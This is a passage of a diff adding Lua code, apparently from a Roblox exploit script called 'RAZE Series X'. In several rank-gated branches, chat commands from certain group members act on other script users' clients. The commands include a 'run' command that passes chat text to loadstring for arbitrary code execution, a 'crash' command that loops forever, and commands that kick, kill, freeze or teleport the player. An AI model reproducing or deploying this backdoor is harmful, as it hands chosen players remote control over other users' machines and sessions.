+                        if v:IsA("BasePart") then
+                            v.Anchored = true
+                        end
+                    end
+                end))
+                getgenv().Froozen = true
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unfreeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                getgenv().Froozen = false
+                if Froozen then
+                    print("UnFroozen")
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."re ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                pcall(function()
+                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+
+        if Message:lower():find(Prefix.."bring ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                if Froozen then
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+                wait()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
+                if getgenv().Froozen == true then
+                    Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                v.Anchored = true
+                            end
+                        end
+                    end))
+                end
+            end
+        end
+        if Message:lower():find(Prefix.."tell") then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." I Am a Fellow RAZE Series X User","All")
+        end
+    elseif Player:GetRankInGroup("16764778") == 254 and UserIds:find(Player.UserId) then
+        if Message:lower():find(Prefix.."game ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                local data = {
+                    PlaceId = game.PlaceId,
+                }
+                local json
+                if writefile then
+                    local json = game:GetService("HttpService"):JSONEncode(data)
+                    writefile("Game.txt", json)
+                end
+                game.Players.LocalPlayer:kick("Premium User Activity | You Are Now DisAllowed From Using RAZE Series X In This Server ~ Premium User:"..Player.Name)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."server ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                local data = {
+                    JobId = game.JobId,
+                }
+                local json
+                if writefile then
+                    local json = game:GetService("HttpService"):JSONEncode(data)
+                    writefile("Server.txt", json)
+                end
+                game.Players.LocalPlayer:kick("Premium User Activity | You Are Now DisAllowed From Using RAZE Series X In This Server ~ Premium User:"..Player.Name)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."run ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                splitt = Message:split(Splitted[1].." "..Splitted[2])
+                pcall(function()
+                    loadstring(splitt[2])()
+                end)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."crash ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                for i=1,math.huge do
+                    pcall(function()
+                        setclipboard("Premium Users Ontop")
+                        print("Premium Users Ontop")
+                    end)
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."kick ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                game.Players.LocalPlayer:kick("Premium User Activity | You Got Kicked By "..Player.Name)
+            end
+        end
+
+        if Message:lower():find(Prefix.."block ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unblock ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        for i,v in pairs(game.workspace["Pls no Delete"]:GetChildren()) do
+                            if v.Name == CurrentPlayer.Name then
+                                v:destroy()
+                            end
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."freeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                        if v:IsA("BasePart") then
+                            v.Anchored = true
+                        end
+                    end
+                end))
+                getgenv().Froozen = true
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unfreeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                getgenv().Froozen = false
+                if Froozen then
+                    print("UnFroozen")
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."re ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                pcall(function()
+                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+
+        if Message:lower():find(Prefix.."bring ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                if Froozen then
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+                wait()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
+                if getgenv().Froozen == true then
+                    Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                v.Anchored = true
+                            end
+                        end
+                    end))
+                end
+            end
+        end
+        if Message:lower():find(Prefix.."tell") then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." I Am a Fellow RAZE Series X User","All")
+        end
+    elseif Player:GetRankInGroup("16764778") == 253 and UserIds:find(Player.UserId) then
+        if Message:lower():find(Prefix.."run ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                splitt = Message:split(Splitted[1].." "..Splitted[2])
+                pcall(function()
+                    loadstring(splitt[2])()
+                end)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."crash ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                for i=1,math.huge do
+                    pcall(function()
+                        setclipboard("Premium Users Ontop")
+                        print("Premium Users Ontop")
+                    end)
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."kick ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                game.Players.LocalPlayer:kick("Premium User Activity | You Got Kicked By "..Player.Name)
+            end
+        end
+
+        if Message:lower():find(Prefix.."block ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unblock ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        for i,v in pairs(game.workspace["Pls no Delete"]:GetChildren()) do
+                            if v.Name == CurrentPlayer.Name then
+                                v:destroy()
+                            end
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."freeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                        if v:IsA("BasePart") then
+                            v.Anchored = true
+                        end
+                    end
+                end))
+                getgenv().Froozen = true
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unfreeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                getgenv().Froozen = false
+                if Froozen then
+                    print("UnFroozen")
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."re ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                pcall(function()
+                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+
+        if Message:lower():find(Prefix.."bring ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                if Froozen then
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+                wait()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
+                if getgenv().Froozen == true then
+                    Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                v.Anchored = true
+                            end
+                        end
+                    end))
+                end
+            end
+        end
+        if Message:lower():find(Prefix.."tell") then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." I Am a Fellow RAZE Series X User","All")
+        end
+    elseif Player:GetRankInGroup("16764778") == 252 and UserIds:find(Player.UserId) then
+        if Message:lower():find(Prefix.."crash ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                for i=1,math.huge do
+                    pcall(function()
+                        setclipboard("Premium Users Ontop")
+                        print("Premium Users Ontop")
+                    end)
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."kick ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                game.Players.LocalPlayer:kick("Premium User Activity | You Got Kicked By "..Player.Name)
+            end
+        end
+
+        if Message:lower():find(Prefix.."block ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
